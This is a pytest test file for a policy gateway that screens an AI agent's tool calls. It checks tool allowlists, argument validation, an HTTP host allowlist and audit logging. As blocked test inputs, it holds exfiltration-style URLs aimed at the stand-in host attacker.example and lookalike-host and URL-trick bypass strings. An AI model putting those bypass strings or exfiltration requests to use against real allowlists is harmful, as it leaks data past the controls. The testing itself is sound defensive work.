import json

import pytest

from gateway.core import Gateway
from gateway.policy import NetworkPolicy, Policy, load_policy

ALL = ["get_time", "list_notes", "read_note", "write_note",
       "run_shell", "http_get", "http_post"]


def make(tmp_path, enforce=True):
    ran = []

    def fake(**args):
        ran.append(args)
        return {"ok": True}

    policy = Policy(
        version=1,
        allowed_tools=ALL[:-1],  # http_post is not allowed
        protected_dirs=["config"],
        network=NetworkPolicy(get_allowed_hosts=["example.com"]),
    )
    gw = Gateway(policy, {n: fake for n in ALL},
                 audit_path=tmp_path / "audit.jsonl", enforce=enforce)
    return gw, ran


def test_allowed_call_runs(tmp_path):
    gw, ran = make(tmp_path)
    assert gw.handle("read_note", {"filename": "a.txt"}) == {"ok": True}
    assert len(ran) == 1


def test_unknown_tool_denied(tmp_path):
    gw, ran = make(tmp_path)
    assert "Blocked" in gw.handle("format_disk", {})["error"]
    assert ran == []


def test_tool_not_in_policy_denied(tmp_path):
    gw, ran = make(tmp_path)
    r = gw.handle("http_post", {"url": "https://example.com/x", "body": "hi"})
    assert "Blocked" in r["error"] and ran == []


def test_bad_arguments_denied(tmp_path):
    gw, ran = make(tmp_path)
    assert "Blocked" in gw.handle("read_note", {})["error"]
    assert "Blocked" in gw.handle("read_note", {"filename": "a", "x": 1})["error"]
    assert "Blocked" in gw.handle("read_note", {"filename": 5})["error"]
    assert ran == []


def test_get_host_allowlist(tmp_path):
    gw, ran = make(tmp_path)
    assert gw.handle("http_get", {"url": "https://example.com/news"}) == {"ok": True}
    assert "Blocked" in gw.handle("http_get", {"url": "https://attacker.example/log?key=abc"})["error"]
    assert "Blocked" in gw.handle("http_get", {"url": "ftp://example.com/x"})["error"]
    assert len(ran) == 1


def test_lookalike_hosts_denied(tmp_path):
    gw, ran = make(tmp_path)
    assert "Blocked" in gw.handle("http_get", {"url": "https://example.com.attacker.example/x"})["error"]
    assert "Blocked" in gw.handle("http_get", {"url": "https://attacker.example/?u=example.com"})["error"]
    assert ran == []


def test_shell_receives_protected_dirs(tmp_path):
    gw, ran = make(tmp_path)
    gw.handle("run_shell", {"command": "ls"})
    assert ran[0]["readonly_dirs"] == ["config"]


def test_log_only_mode_runs_but_records_denial(tmp_path):
    gw, ran = make(tmp_path, enforce=False)
    gw.handle("http_get", {"url": "https://attacker.example/x"})
    assert len(ran) == 1
    entry = json.loads((tmp_path / "audit.jsonl").read_text().splitlines()[-1])
    assert entry["decision"] == "deny" and entry["enforced"] is False


def test_every_call_is_audited(tmp_path):
    gw, _ = make(tmp_path)
    gw.handle("list_notes", {})
    gw.handle("http_get", {"url": "https://attacker.example/x"})
    lines = (tmp_path / "audit.jsonl").read_text().splitlines()
    assert [json.loads(l)["decision"] for l in lines] == ["allow", "deny"]


def test_policy_typo_is_rejected(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text("version: 1\nallowed_tools: [list_notes]\nprotectd_dirs: [config]\n")
    with pytest.raises(ValueError):
        load_policy(p)


def test_default_policy_loads():
    policy = load_policy("policies/default.yaml")
    assert "http_post" not in policy.allowed_tools
    assert {"config", "secrets", "important"} <= set(policy.protected_dirs)

def test_url_tricks_denied(tmp_path):
    gw, ran = make(tmp_path)
    for url in ("https://example.com@attacker.example/x",
                "https://attacker.example#@example.com/"):
        assert "Blocked" in gw.handle("http_get", {"url": url})["error"]
    assert ran == []


def test_host_case_is_ignored(tmp_path):
    gw, ran = make(tmp_path)
    assert gw.handle("http_get", {"url": "https://EXAMPLE.com/news"}) == {"ok": True}